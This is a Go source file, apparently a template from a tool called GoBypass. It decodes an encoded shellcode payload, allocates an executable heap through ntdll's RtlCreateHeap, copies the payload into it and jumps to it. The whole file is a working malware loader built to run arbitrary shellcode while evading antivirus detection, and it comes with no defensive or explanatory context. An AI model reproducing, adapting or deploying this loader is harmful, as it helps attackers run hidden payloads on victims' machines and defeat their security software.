package main

import (
	"encoding/hex"
	"github.com/EmYiQing/GoBypass/encode"
	"syscall"
	"unsafe"
)

var (
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	RtlCreateHeap   = ntdll.NewProc("RtlCreateHeap")
	RtlAllocateHeap = ntdll.NewProc("RtlAllocateHeap")
)

func main() {
	shellcode, _ := hex.DecodeString(encode.Decode("__SHELLCODE__"))
	shellSize := uintptr(len(shellcode))
	handle, _, _ := RtlCreateHeap.Call(0x00040000|0x00000002, 0, shellSize, shellSize, 0, 0)
	alloc, _, _ := RtlAllocateHeap.Call(handle, 0x00000008, shellSize)

	for index := uint32(0); index < uint32(len(shellcode)); index++ {
		writePtr := unsafe.Pointer(alloc + uintptr(index))
		v := (*byte)(writePtr)
		*v = shellcode[index]
	}
	_, _, _ = syscall.Syscall(alloc, 0, 0, 0, 0)
}
